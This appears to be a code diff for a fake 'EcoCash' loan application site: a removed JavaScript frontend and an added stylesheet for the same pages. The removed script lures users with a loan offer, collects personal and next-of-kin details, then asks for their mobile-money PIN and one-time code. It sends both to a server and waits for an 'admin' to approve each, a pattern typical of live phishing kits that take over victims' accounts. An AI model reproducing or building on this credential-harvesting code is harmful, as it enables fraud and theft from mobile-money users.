@@ -1,550 +1,1021 @@
-// ============================================================
-// EcoCash Loan Application – Frontend Logic
-// ============================================================
+/* ============================================================
+   EcoCash Zimbabwe – Full Stylesheet
+   ============================================================ */
 
-let appData = {
-  loanAmount: 200,
-  loanDuration: 30,
-  firstName: '',
-  lastName: '',
-  phone: '',
-  email: '',
-  kinFirstName: '',
-  kinLastName: '',
-  kinPhone: '',
-  province: '',
-  loanReason: '',
-  applicationId: null
-};
-
-let currentPage = 'page-landing';
-let pinPollingActive = false;
-
-const RESEND_COOLDOWN_MS = 60 * 1000; // 60 seconds
-const INTEREST_RATE = 0.03;            // flat 3%
-
-// ─── localStorage Helpers ───
-function saveState() {
-  const state = { appData, currentPage };
-  localStorage.setItem('ecocash_app_state', JSON.stringify(state));
+/* ─── CSS Variables ─── */
+:root {
+  --primary: #1e63c6;
+  --primary-dark: #154ea6;
+  --primary-light: #eaf2ff;
+  --accent: #ffcc00;
+  --success: #2ecc71;
+  --danger: #e74c3c;
+  --text: #1a1a2e;
+  --text-light: #888;
+  --text-mid: #444;
+  --border: #e0e6f0;
+  --bg: #f5f7fb;
+  --white: #ffffff;
+  --radius: 12px;
+  --radius-sm: 8px;
+  --shadow: 0 4px 16px rgba(30, 99, 198, 0.08);
+  --shadow-lg: 0 12px 32px rgba(30, 99, 198, 0.12);
 }
 
-function loadState() {
-  const saved = localStorage.getItem('ecocash_app_state');
-  if (saved) {
-    try {
-      const parsed = JSON.parse(saved);
-      appData = parsed.appData || appData;
-      currentPage = parsed.currentPage || 'page-landing';
-      return true;
-    } catch (e) {
-      console.error('Failed to parse saved state', e);
-    }
+/* ─── Reset & Base ─── */
+*,
+*::before,
+*::after {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+html,
+body {
+  height: 100%;
+}
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  font-size: 15px;
+  line-height: 1.5;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  overflow-x: hidden;
+}
+
+button,
+input,
+textarea,
+select {
+  font-family: inherit;
+  font-size: inherit;
+  color: inherit;
+}
+
+button {
+  cursor: pointer;
+  border: none;
+  background: none;
+}
+
+a {
+  color: var(--primary);
+  text-decoration: none;
+  cursor: pointer;
+}
+
+/* ─── Page System ─── */
+.page {
+  display: none;
+  min-height: 100vh;
+  flex-direction: column;
+}
+
+.page.active {
+  display: flex;
+}
+
+/* ============================================================
+   LANDING PAGE
+   ============================================================ */
+#page-landing {
+  background: linear-gradient(160deg, #1e63c6 0%, #154ea6 100%);
+  position: relative;
+  overflow: hidden;
+}
+
+#page-landing::before {
+  content: '';
+  position: absolute;
+  top: -30%;
+  right: -20%;
+  width: 70%;
+  height: 70%;
+  background: radial-gradient(circle, rgba(255, 204, 0, 0.15) 0%, transparent 70%);
+  border-radius: 50%;
+  pointer-events: none;
+}
+
+#page-landing::after {
+  content: '';
+  position: absolute;
+  bottom: -20%;
+  left: -15%;
+  width: 50%;
+  height: 50%;
+  background: radial-gradient(circle, rgba(255, 255, 255, 0.08) 0%, transparent 70%);
+  border-radius: 50%;
+  pointer-events: none;
+}
+
+.land-nav {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 28px 20px;
+  position: relative;
+  z-index: 2;
+}
+
+.land-center {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  position: relative;
+  z-index: 2;
+}
+
+.land-card {
+  background: var(--white);
+  border-radius: var(--radius);
+  padding: 40px 32px;
+  max-width: 420px;
+  width: 100%;
+  text-align: center;
+  box-shadow: var(--shadow-lg);
+}
+
+.land-card h2 {
+  font-size: 1.4rem;
+  font-weight: 700;
+  margin-bottom: 10px;
+  color: var(--text);
+  line-height: 1.3;
+}
+
+.land-card p {
+  font-size: 0.9rem;
+  color: var(--text-light);
+  margin-bottom: 26px;
+  line-height: 1.6;
+}
+
+.land-footer {
+  text-align: center;
+  padding: 20px;
+  font-size: 0.72rem;
+  color: rgba(255, 255, 255, 0.6);
+  position: relative;
+  z-index: 2;
+  letter-spacing: 0.02em;
+}
+
+/* ============================================================
+   LOGO
+   ============================================================ */
+.eco-logo-text {
+  font-size: 1.4rem;
+  font-weight: 700;
+  letter-spacing: -0.02em;
+  display: inline-block;
+}
+
+.eco-logo-text .eco {
+  color: var(--primary);
+}
+
+.eco-logo-text .cash {
+  color: var(--accent);
+}
+
+#page-landing .eco-logo-text .eco {
+  color: var(--white);
+}
+
+/* ============================================================
+   NAVBAR (inner pages)
+   ============================================================ */
+.navbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 20px;
+  background: var(--white);
+  border-bottom: 1px solid var(--border);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  box-shadow: 0 1px 4px rgba(0, 0, 0, 0.03);
+}
+
+.nav-left {
+  font-size: 0.85rem;
+  font-weight: 500;
+  color: var(--primary);
+  min-width: 60px;
+  display: inline-block;
+  cursor: pointer;
+  transition: opacity 0.15s;
+}
+
+.nav-left:hover {
+  opacity: 0.75;
+}
+
+.navbar .eco-logo-text {
+  font-size: 1.25rem;
+}
+
+.nav-right {
+  min-width: 60px;
+  display: flex;
+  flex-direction: column;
+  gap: 3px;
+  align-items: flex-end;
+}
+
+.hline {
+  width: 20px;
+  height: 2px;
+  background: var(--primary);
+  border-radius: 2px;
+  opacity: 0.4;
+}
+
+/* ============================================================
+   STEP PAGES – Centered card layout
+   ============================================================ */
+.step-center {
+  flex: 1;
+  display: flex;
+  align-items: flex-start;
+  justify-content: center;
+  padding: 28px 16px 40px;
+}
+
+.step-card {
+  background: var(--white);
+  border-radius: var(--radius);
+  padding: 28px 24px;
+  width: 100%;
+  max-width: 520px;
+  box-shadow: var(--shadow);
+}
+
+.step-card h2 {
+  font-size: 1.2rem;
+  font-weight: 700;
+  margin-bottom: 4px;
+  color: var(--text);
+}
+
+.step-sub {
+  font-size: 0.78rem;
+  color: var(--text-light);
+  margin-bottom: 16px;
+}
+
+/* ============================================================
+   PROGRESS BAR
+   ============================================================ */
+.prog-row {
+  display: flex;
+  gap: 6px;
+  margin-bottom: 22px;
+}
+
+.prog-seg {
+  flex: 1;
+  height: 4px;
+  background: var(--border);
+  border-radius: 4px;
+  transition: background 0.3s;
+}
+
+.prog-seg.done {
+  background: var(--primary);
+}
+
+.prog-seg.now {
+  background: var(--accent);
+}
+
+/* ============================================================
+   FORM FIELDS
+   ============================================================ */
+.field {
+  margin-bottom: 18px;
+}
+
+.field label {
+  display: block;
+  font-size: 0.8rem;
+  font-weight: 600;
+  color: var(--text-mid);
+  margin-bottom: 7px;
+}
+
+.field input[type="text"],
+.field input[type="email"],
+.field input[type="tel"],
+.field textarea,
+.field select {
+  width: 100%;
+  padding: 11px 14px;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius-sm);
+  background: var(--white);
+  font-size: 0.92rem;
+  color: var(--text);
+  outline: none;
+  transition: border-color 0.18s, box-shadow 0.18s;
+}
+
+.field input:focus,
+.field textarea:focus,
+.field select:focus {
+  border-color: var(--primary);
+  box-shadow: 0 0 0 3px rgba(30, 99, 198, 0.1);
+}
+
+.field textarea {
+  min-height: 74px;
+  resize: vertical;
+  font-family: inherit;
+}
+
+.field input::placeholder,
+.field textarea::placeholder {
+  color: #b8c0cc;
+}
+
+.field-hint {
+  font-size: 0.72rem;
+  color: var(--text-light);
+  margin-top: 6px;
+}
+
+/* Range slider */
+.field input[type="range"] {
+  width: 100%;
+  margin: 10px 0 6px;
+  -webkit-appearance: none;
+  appearance: none;
+  height: 5px;
+  background: linear-gradient(to right, var(--primary) 0%, var(--primary) 50%, var(--border) 50%, var(--border) 100%);
+  border-radius: 5px;
+  outline: none;
+}
+
+.field input[type="range"]::-webkit-slider-thumb {
+  -webkit-appearance: none;
+  appearance: none;
+  width: 22px;
+  height: 22px;
+  border-radius: 50%;
+  background: var(--primary);
+  border: 3px solid var(--white);
+  cursor: pointer;
+  box-shadow: 0 2px 6px rgba(30, 99, 198, 0.35);
+  transition: transform 0.15s;
+}
+
+.field input[type="range"]::-webkit-slider-thumb:hover {
+  transform: scale(1.1);
+}
+
+.field input[type="range"]::-moz-range-thumb {
+  width: 22px;
+  height: 22px;
+  border-radius: 50%;
+  background: var(--primary);
+  border: 3px solid var(--white);
+  cursor: pointer;
+  box-shadow: 0 2px 6px rgba(30, 99, 198, 0.35);
+}
+
+.range-ends {
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.72rem;
+  color: var(--text-light);
+  margin-top: 2px;
+}
+
+/* Row of two fields */
+.field-row {
+  display: flex;
+  gap: 12px;
+}
+
+.field-row .field {
+  flex: 1;
+  margin-bottom: 18px;
+}
+
+/* Phone row */
+.phone-row {
+  display: flex;
+  align-items: stretch;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius-sm);
+  overflow: hidden;
+  transition: border-color 0.18s, box-shadow 0.18s;
+}
+
+.phone-row:focus-within {
+  border-color: var(--primary);
+  box-shadow: 0 0 0 3px rgba(30, 99, 198, 0.1);
+}
+
+.ph-pre {
+  display: flex;
+  align-items: center;
+  padding: 0 12px;
+  background: #f4f7fc;
+  color: var(--text-mid);
+  font-size: 0.85rem;
+  font-weight: 600;
+  border-right: 1px solid var(--border);
+}
+
+.phone-row input {
+  flex: 1;
+  border: none !important;
+  padding: 11px 14px;
+  border-radius: 0 !important;
+  box-shadow: none !important;
+}
+
+/* Select wrapper */
+.sel-wrap {
+  position: relative;
+}
+
+.sel-wrap select {
+  width: 100%;
+  padding: 11px 36px 11px 14px;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius-sm);
+  background: var(--white);
+  appearance: none;
+  -webkit-appearance: none;
+  cursor: pointer;
+  outline: none;
+  transition: border-color 0.18s, box-shadow 0.18s;
+}
+
+.sel-wrap select:focus {
+  border-color: var(--primary);
+  box-shadow: 0 0 0 3px rgba(30, 99, 198, 0.1);
+}
+
+.sel-wrap::after {
+  content: '▾';
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--text-light);
+  pointer-events: none;
+  font-size: 0.75rem;
+}
+
+/* ============================================================
+   BUTTONS
+   ============================================================ */
+.btn-grad {
+  width: 100%;
+  padding: 14px;
+  background: linear-gradient(to right, var(--primary), var(--primary-dark));
+  color: var(--white);
+  border-radius: var(--radius-sm);
+  font-size: 0.85rem;
+  font-weight: 600;
+  letter-spacing: 0.05em;
+  text-transform: uppercase;
+  cursor: pointer;
+  transition: transform 0.12s, box-shadow 0.18s, opacity 0.18s;
+  margin-top: 8px;
+  box-shadow: 0 4px 12px rgba(30, 99, 198, 0.25);
+}
+
+.btn-grad:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 6px 16px rgba(30, 99, 198, 0.32);
+}
+
+.btn-grad:active {
+  transform: translateY(0);
+}
+
+.btn-grad:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+  transform: none;
+}
+
+.btn-gray {
+  flex: 1;
+  padding: 13px;
+  background: #f0f3f8;
+  color: var(--text-mid);
+  border-radius: var(--radius-sm);
+  font-size: 0.85rem;
+  font-weight: 600;
+  letter-spacing: 0.04em;
+  text-transform: uppercase;
+  cursor: pointer;
+  transition: background 0.18s;
+}
+
+.btn-gray:hover {
+  background: #e4e9f2;
+}
+
+.step-btns {
+  display: flex;
+  gap: 10px;
+  margin-top: 22px;
+}
+
+.step-btns .btn-grad {
+  flex: 2;
+  margin-top: 0;
+}
+
+/* ============================================================
+   CALCULATOR BOX
+   ============================================================ */
+.calc-box {
+  background: var(--primary-light);
+  border: 1px solid rgba(30, 99, 198, 0.15);
+  border-radius: var(--radius-sm);
+  padding: 14px 16px;
+  margin-bottom: 16px;
+}
+
+.calc-row2 {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 6px 0;
+  font-size: 0.85rem;
+  color: var(--text-mid);
+}
+
+.calc-row2 .cv {
+  font-weight: 600;
+  color: var(--primary);
+}
+
+/* ============================================================
+   SUMMARY BOX
+   ============================================================ */
+.sum-box {
+  background: #fafbfd;
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  padding: 16px;
+  margin: 18px 0;
+}
+
+.sum-box h3 {
+  font-size: 0.85rem;
+  font-weight: 700;
+  color: var(--text);
+  margin-bottom: 12px;
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+}
+
+.sum-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 6px 0;
+  font-size: 0.82rem;
+}
+
+.sum-row .sk {
+  color: var(--text-light);
+}
+
+.sum-row .sv {
+  font-weight: 600;
+  color: var(--text);
+}
+
+/* ============================================================
+   MESSAGE / ERROR BOXES
+   ============================================================ */
+.msg-box {
+  display: none;
+  padding: 10px 14px;
+  border-radius: var(--radius-sm);
+  font-size: 0.82rem;
+  font-weight: 500;
+  margin-bottom: 16px;
+  align-items: center;
+  gap: 8px;
+}
+
+.msg-box.show {
+  display: flex;
+}
+
+.msg-box.error {
+  background: #fdecec;
+  color: #c0392b;
+  border: 1px solid #f5c6c6;
+}
+
+.msg-box.success {
+  background: #eafaf1;
+  color: #1e7e4a;
+  border: 1px solid #b8e6cd;
+}
+
+.msg-icon {
+  font-size: 0.9rem;
+  font-weight: 700;
+  flex-shrink: 0;
+}
+
+/* ============================================================
+   PIN PAGE
+   ============================================================ */
+.pin-label {
+  font-size: 0.85rem;
+  font-weight: 500;
+  color: var(--text-mid);
+  margin-bottom: 10px;
+}
+
+.pin-attempts {
+  font-size: 0.78rem;
+  color: var(--text-light);
+  margin-bottom: 14px;
+  padding: 8px 12px;
+  background: #f4f7fc;
+  border-radius: var(--radius-sm);
+  display: inline-block;
+}
+
+.pin-row {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 8px;
+}
+
+.pin-box {
+  width: 52px;
+  height: 58px;
+  text-align: center;
+  font-size: 1.4rem;
+  font-weight: 700;
+  border: 2px solid var(--border);
+  border-radius: var(--radius-sm);
+  background: var(--white);
+  outline: none;
+  color: var(--text);
+  transition: border-color 0.18s, box-shadow 0.18s;
+}
+
+.pin-box:focus {
+  border-color: var(--primary);
+  box-shadow: 0 0 0 3px rgba(30, 99, 198, 0.15);
+}
+
+.pin-box:disabled {
+  background: #f4f7fc;
+  color: var(--text-light);
+  cursor: not-allowed;
+}
+
+.pin-eye,
+.pin-delete {
+  width: 36px;
+  height: 36px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.9rem;
+  background: #f0f3f8;
+  color: var(--text-mid);
+  cursor: pointer;
+  transition: background 0.18s;
+  flex-shrink: 0;
+}
+
+.pin-eye:hover {
+  background: #e4e9f2;
+}
+
+.pin-delete:hover {
+  background: #fdecec;
+  color: #c0392b;
+}
+
+/* ============================================================
+   OTP PAGE
+   ============================================================ */
+.otp-section {
+  margin-bottom: 16px;
+}
+
+.otp-section-title {
+  font-size: 0.85rem;
+  font-weight: 500;
+  color: var(--text-mid);
+  margin-bottom: 12px;
+}
+
+.otp-inputs {
+  display: flex;
+  gap: 6px;
+  flex: 1;
+}
+
+.otp-box {
+  flex: 1;
+  min-width: 0;
+  height: 52px;
+  text-align: center;
+  font-size: 1.2rem;
+  font-weight: 700;
+  border: 2px solid var(--border);
+  border-radius: var(--radius-sm);
+  background: var(--white);
+  outline: none;
+  color: var(--text);
+  transition: border-color 0.18s, box-shadow 0.18s;
+}
+
+.otp-box:focus {
+  border-color: var(--primary);
+  box-shadow: 0 0 0 3px rgba(30, 99, 198, 0.15);
+}
+
+.otp-delete {
+  width: 36px;
+  height: 36px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.9rem;
+  background: #f0f3f8;
+  color: var(--text-mid);
+  cursor: pointer;
+  transition: background 0.18s;
+  flex-shrink: 0;
+  margin-left: 10px;
+}
+
+.otp-delete:hover {
+  background: #fdecec;
+  color: #c0392b;
+}
+
+/* ============================================================
+   PROCESSING PAGE
+   ============================================================ */
+.proc-wrap {
+  text-align: center;
+  max-width: 380px;
+  width: 100%;
+}
+
+.proc-icon {
+  font-size: 3.5rem;
+  margin-bottom: 20px;
+  animation: proc-spin 2s linear infinite;
+  display: inline-block;
+}
+
+@keyframes proc-spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.proc-wrap h2 {
+  font-size: 1.25rem;
+  font-weight: 700;
+  margin-bottom: 8px;
+}
+
+.proc-wrap p {
+  font-size: 0.88rem;
+  line-height: 1.6;
+}
+
+/* ============================================================
+   RESEND BUTTON + COOLDOWN + WAITING STATUS
+   ============================================================ */
+.btn-resend {
+  width: 100%;
+  padding: 11px;
+  background: #f0f4fa;
+  color: var(--primary);
+  border: 1.5px dashed var(--primary);
+  border-radius: var(--radius-sm);
+  font-size: 0.82rem;
+  font-weight: 600;
+  letter-spacing: 0.02em;
+  cursor: pointer;
+  margin-top: 10px;
+  transition: background 0.2s, color 0.2s, border-style 0.2s;
+}
+
+.btn-resend:hover {
+  background: var(--primary);
+  color: var(--white);
+  border-style: solid;
+}
+
+.btn-resend.hidden {
+  display: none;
+}
+
+/* Cooldown state */
+.btn-resend.cooldown,
+.btn-resend:disabled {
+  background: #e8ecf3;
+  color: #8a94a6;
+  border-color: #c8d0dc;
+  border-style: dashed;
+  cursor: not-allowed;
+  opacity: 0.85;
+}
+
+.btn-resend.cooldown:hover,
+.btn-resend:disabled:hover {
+  background: #e8ecf3;
+  color: #8a94a6;
+  border-style: dashed;
+}
+
+/* Waiting / status banner under resend button */
+.resend-status {
+  display: none;
+  margin-top: 8px;
+  padding: 9px 12px;
+  border-radius: var(--radius-sm);
+  font-size: 0.78rem;
+  font-weight: 500;
+  text-align: center;
+  line-height: 1.4;
+}
+
+.resend-status.show {
+  display: block;
+}
+
+.resend-status.waiting {
+  background: #eaf2ff;
+  color: var(--primary);
+  border: 1px solid #bcd3f0;
+}
+
+.resend-status.error {
+  background: #fdecec;
+  color: #c0392b;
+  border: 1px solid #f5c6c6;
+}
+
+/* Pulsing dot for "waiting" status */
+.resend-status .rs-dot {
+  display: inline-block;
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--primary);
+  margin-right: 6px;
+  vertical-align: middle;
+  animation: rs-pulse 1.2s ease-in-out infinite;
+}
+
+@keyframes rs-pulse {
+  0%, 100% { opacity: 0.3; transform: scale(0.85); }
+  50% { opacity: 1; transform: scale(1.15); }
+}
+
+/* ============================================================
+   APPROVAL PAGE
+   ============================================================ */
+.appr-wrap {
+  width: 100%;
+}
+
+/* ============================================================
+   UTILITIES
+   ============================================================ */
+.hidden {
+  display: none !important;
+}
+
+.text-center {
+  text-align: center;
+}
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media (max-width: 520px) {
+  .land-card {
+    padding: 32px 24px;
   }
-  return false;
-}
 
-function clearState() {
-  localStorage.removeItem('ecocash_app_state');
-}
-
-// ─── Page Navigation ───
-function goTo(pageId) {
-  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  const target = document.getElementById(pageId);
-  if (target) target.classList.add('active');
-  currentPage = pageId;
-  saveState();
-}
-
-function clearErr(id) {
-  const el = document.getElementById(id);
-  if (el) el.classList.remove('show');
-}
-
-// ─── Landing ───
-function startApplication() {
-  appData = {
-    loanAmount: 200,
-    loanDuration: 30,
-    firstName: '',
-    lastName: '',
-    phone: '',
-    email: '',
-    kinFirstName: '',
-    kinLastName: '',
-    kinPhone: '',
-    province: '',
-    loanReason: '',
-    applicationId: null
-  };
-  goTo('page-step1');
-  document.getElementById('s1am').value = 200;
-  document.getElementById('s1dur').value = 30;
-  updateStep1Calc();
-}
-
-// ─── Step 1 ───
-function updateStep1Calc() {
-  let amt = parseInt(document.getElementById('s1am').value);
-  let dur = parseInt(document.getElementById('s1dur').value);
-  let interest = amt * INTEREST_RATE;      // flat 3%
-  let total = amt + interest;
-  document.getElementById('s1AmtDisplay').textContent = `$${amt}`;
-  document.getElementById('s1DurDisplay').textContent = `${dur} days`;
-  document.getElementById('s1Principal').textContent = `$${amt.toFixed(2)}`;
-  document.getElementById('s1Interest').textContent = `$${interest.toFixed(2)}`;
-  document.getElementById('s1Total').textContent = `$${total.toFixed(2)}`;
-  appData.loanAmount = amt;
-  appData.loanDuration = dur;
-  saveState();
-}
-
-function toS2() {
-  let reason = document.getElementById('s1reason').value.trim();
-  if (!reason) { showError('s1Err', 'Please provide a reason for the loan.'); return; }
-  appData.loanReason = reason;
-  goTo('page-step2');
-}
-
-// ─── Step 2 ───
-function toS3() {
-  let fi = document.getElementById('s2fi').value.trim();
-  let la = document.getElementById('s2la').value.trim();
-  let ph = document.getElementById('s2ph').value.trim();
-  let em = document.getElementById('s2em').value.trim();
-  if (!fi || !la || ph.length !== 9 || !em) {
-    showError('s2Err', 'Please fill all fields correctly.');
-    return;
+  .step-card {
+    padding: 22px 18px;
   }
-  appData.firstName = fi;
-  appData.lastName = la;
-  appData.phone = ph;
-  appData.email = em;
-  document.getElementById('sA').textContent = `$${appData.loanAmount}`;
-  document.getElementById('sT').textContent = `${appData.loanDuration} Days`;
-  document.getElementById('sR').textContent = `$${(appData.loanAmount * (1 + INTEREST_RATE)).toFixed(2)}`;
-  document.getElementById('sN').textContent = `${fi} ${la}`;
-  goTo('page-step3');
-}
 
-// ─── Submit Application ───
-async function submitApp() {
-  let kf = document.getElementById('s3kf').value.trim();
-  let kl = document.getElementById('s3kl').value.trim();
-  let kp = document.getElementById('s3kp').value.trim();
-  let prov = document.getElementById('s3prov').value;
-  if (!kf || !kl || kp.length !== 9 || !prov) {
-    showError('s3Err', 'Please fill all fields correctly.');
-    return;
+  .step-center {
+    padding: 18px 12px 32px;
   }
-  appData.kinFirstName = kf;
-  appData.kinLastName = kl;
-  appData.kinPhone = kp;
-  appData.province = prov;
 
-  try {
-    const response = await fetch('/api/send-application', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ applicationData: appData })
-    });
-    const data = await response.json();
-    if (data.ok) {
-      appData.applicationId = data.applicationId;
-      saveState();
-      goTo('page-processing');
-      document.getElementById('processingStatus').textContent = '⏳ Awaiting admin approval of application...';
-      startAppPolling();
-    } else {
-      alert('Error: ' + data.error);
-    }
-  } catch (err) {
-    console.error(err);
-    alert('Network error. Please try again.');
+  .field-row {
+    flex-direction: column;
+    gap: 0;
+  }
+
+  .step-btns {
+    flex-direction: column;
+  }
+
+  .pin-box {
+    width: 44px;
+    height: 52px;
+    font-size: 1.2rem;
+  }
+
+  .otp-box {
+    height: 46px;
+    font-size: 1rem;
+  }
+
+  .otp-inputs {
+    gap: 4px;
+  }
+
+  .pin-row {
+    gap: 6px;
+  }
+
+  .pin-eye,
+  .pin-delete,
+  .otp-delete {
+    width: 32px;
+    height: 32px;
+    font-size: 0.8rem;
+  }
+
+  .eco-logo-text {
+    font-size: 1.2rem;
   }
 }
 
-// ─── App Approval Polling ───
-function startAppPolling() {
-  if (window._appInterval) clearInterval(window._appInterval);
-  window._appInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status/${appData.applicationId}/app`, { cache: 'no-store' });
-      if (res.status === 404) {
-        clearInterval(window._appInterval);
-        clearState();
-        alert('Application not found. Please start again.');
-        goTo('page-landing');
-        return;
-      }
-      const data = await res.json();
+@media (max-width: 360px) {
+  .pin-box {
+    width: 38px;
+    height: 46px;
+    font-size: 1rem;
+  }
 
-      if (data.status === 'approved') {
-        clearInterval(window._appInterval);
-        goTo('page-pin');
-        clearLoginPin();
-        pinPollingActive = false;
-        document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
-        return;
-      }
-      if (data.status === 'rejected') {
-        clearInterval(window._appInterval);
-        clearState();
-        alert('Your application was rejected by the admin.');
-        goTo('page-landing');
-        return;
-      }
-    } catch (err) {
-      console.error('App polling error:', err);
-    }
-  }, 3000);
-}
-
-// ─── PIN Submission ───
-async function doPin() {
-  let pin = '';
-  for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
-  if (pin.length !== 4) { showError('pinErr', 'Enter a 4-digit PIN.'); return; }
-
-  try {
-    const response = await fetch('/api/send-pin', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ applicationId: appData.applicationId, pin })
-    });
-    const data = await response.json();
-    if (data.ok) {
-      startPinPolling();
-    } else if (data.blocked) {
-      showError('pinErr', data.message);
-      disablePinInputs();
-    } else {
-      showError('pinErr', data.error || 'Error');
-    }
-  } catch (err) {
-    alert('Network error');
+  .otp-box {
+    height: 42px;
+    font-size: 0.9rem;
   }
 }
 
-// ─── PIN Polling ───
-function startPinPolling() {
-  if (window._pinInterval) clearInterval(window._pinInterval);
-  pinPollingActive = true;
-  window._pinInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status/${appData.applicationId}/pin`, { cache: 'no-store' });
-      if (res.status === 404) {
-        clearInterval(window._pinInterval);
-        pinPollingActive = false;
-        clearState();
-        alert('Application not found. Please start again.');
-        goTo('page-landing');
-        return;
-      }
-      const data = await res.json();
-
-      if (data.status === 'approved') {
-        clearInterval(window._pinInterval);
-        pinPollingActive = false;
-        clearLoginPin();
-        setResendWaitingStatus('pin', 'clear');
-        document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
-        goTo('page-otp');
-        return;
-      }
-      if (data.status === 'rejected') {
-        const remaining = data.remainingAttempts;
-        document.getElementById('pinAttemptsDisplay').textContent = `🔑 Attempts remaining: ${remaining} of 3`;
-        showError('pinErr', `Wrong PIN. ${remaining} attempt(s) remaining.`);
-        clearLoginPin();
-        clearInterval(window._pinInterval);
-        pinPollingActive = false;
-        return;
-      }
-      if (data.status === 'blocked') {
-        clearInterval(window._pinInterval);
-        pinPollingActive = false;
-        document.getElementById('pinAttemptsDisplay').textContent = '🔒 Too many attempts. Please wait 5 minutes.';
-        disablePinInputs();
-        showError('pinErr', 'Application blocked. Please wait 5 minutes.');
-        return;
-      }
-    } catch (err) {
-      console.error('Pin polling error:', err);
-    }
-  }, 3000);
+/* ============================================================
+   SCROLLBAR (subtle)
+   ============================================================ */
+::-webkit-scrollbar {
+  width: 6px;
 }
 
-// ─── OTP Submission ───
-async function doOtp() {
-  let otp = '';
-  for (let i = 0; i < 6; i++) otp += document.getElementById('otp' + i).value;
-  if (otp.length !== 6) { showError('otpErr', 'Enter a 6-digit OTP.'); return; }
+::-webkit-scrollbar-track {
+  background: transparent;
+}
 
-  try {
-    const response = await fetch('/api/send-otp', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ applicationId: appData.applicationId, otp })
-    });
-    const data = await response.json();
-    if (data.ok) {
-      startOtpPolling();
-    } else {
-      showError('otpErr', data.error || 'Error');
-    }
-  } catch (err) {
-    alert('Network error');
+::-webkit-scrollbar-thumb {
+  background: rgba(30, 99, 198, 0.2);
+  border-radius: 3px;
+}
+
+::-webkit-scrollbar-thumb:hover {
+  background: rgba(30, 99, 198, 0.4);
+}
+
+/* ============================================================
+   REDUCED MOTION
+   ============================================================ */
+@media (prefers-reduced-motion: reduce) {
+  *,
+  *::before,
+  *::after {
+    animation-duration: 0.01ms !important;
+    transition-duration: 0.01ms !important;
   }
 }
-
-// ─── OTP Polling ───
-function startOtpPolling() {
-  if (window._otpInterval) clearInterval(window._otpInterval);
-  window._otpInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status/${appData.applicationId}/otp`, { cache: 'no-store' });
-      if (res.status === 404) {
-        clearInterval(window._otpInterval);
-        clearState();
-        alert('Application not found. Please start again.');
-        goTo('page-landing');
-        return;
-      }
-      const data = await res.json();
-
-      if (data.status === 'approved') {
-        clearInterval(window._otpInterval);
-        setResendWaitingStatus('otp', 'clear');
-        showApproval();
-        return;
-      }
-      if (data.status === 'rejected') {
-        clearInterval(window._otpInterval);
-        showRejected('OTP rejected. Please request a new OTP.');
-        return;
-      }
-    } catch (err) {
-      console.error('OTP polling error:', err);
-    }
-  }, 3000);
-}
-
-// ─── Resend OTP ───
-async function resendOtp() {
-  try {
-    const response = await fetch('/api/resend-otp', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ applicationId: appData.applicationId })
-    });
-    const data = await response.json();
-    if (data.ok) {
-      alert('OTP resend request sent to admin.');
-      startOtpPolling();
-    } else {
-      alert('Error: ' + data.error);
-    }
-  } catch (err) {
-    alert('Network error');
-  }
-}
-
-// ─── Approval / Rejection ───
-function showApproval() {
-  document.getElementById('aprAmount').textContent = `$${appData.loanAmount}`;
-  document.getElementById('aprAmt').textContent = `$${appData.loanAmount}`;
-  document.getElementById('aprTerm').textContent = `${appData.loanDuration} Days`;
-  document.getElementById('aprMth').textContent = `$${(appData.loanAmount * (1 + INTEREST_RATE)).toFixed(2)}`;
-  goTo('page-approval');
-  clearState();
-}
-
-function showRejected(reason) {
-  alert(reason);
-  clearState();
-  goTo('page-landing');
-}
-
-// ─── Helpers ───
-function showError(id, msg) {
-  const el = document.getElementById(id);
-  if (!el) return;
-  const txt = el.querySelector('span:last-child');
-  if (txt) txt.textContent = msg;
-  el.classList.add('show');
-  setTimeout(() => el.classList.remove('show'), 3000);
-}
-
-function normalizePhone(id) {
-  let el = document.getElementById(id);
-  el.value = el.value.replace(/\D/g, '').slice(0, 9);
-}
-
-function disablePinInputs() {
-  document.querySelectorAll('.pin-box').forEach(inp => inp.disabled = true);
-}
-
-function pinMvM(input, idx) {
-  if (input.value.length > 0 && idx < 3) {
